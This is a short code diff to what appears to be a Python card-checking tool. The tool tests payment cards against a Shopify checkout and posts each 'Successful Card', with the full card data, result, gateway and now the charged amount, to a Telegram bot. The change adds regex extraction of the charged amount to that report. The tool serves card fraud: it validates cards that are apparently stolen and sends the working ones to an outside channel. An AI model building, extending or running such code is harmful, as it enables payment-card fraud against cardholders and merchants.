@@ -112,9 +112,17 @@ def process_cards(cards, shopify_url, telegram_bot_token, telegram_user_id, cust
             
             # Send success to Telegram if configured
             if result.get('status') and telegram_bot_token and telegram_user_id:
+                # Extract amount if available
+                amount = ""
+                if "Charged" in result.get('result', ''):
+                    amount_match = re.search(r'Charged\s+(\$\d+\.\d+)', result.get('result', ''))
+                    if amount_match:
+                        amount = f"💰 Amount: {amount_match.group(1)}\\n"
+                
                 message = f"✅ *Successful Card*\\n" \
                           f"💳 `{card_data}`\\n" \
                           f"🔍 Result: {result.get('result', 'N/A')}\\n" \
+                          f"{amount}" \
                           f"📝 Message: {result.get('message', 'N/A')}\\n" \
                           f"🌐 Gateway: {result.get('gateway', 'N/A')}"
                 send_telegram_message(telegram_bot_token, telegram_user_id, message)
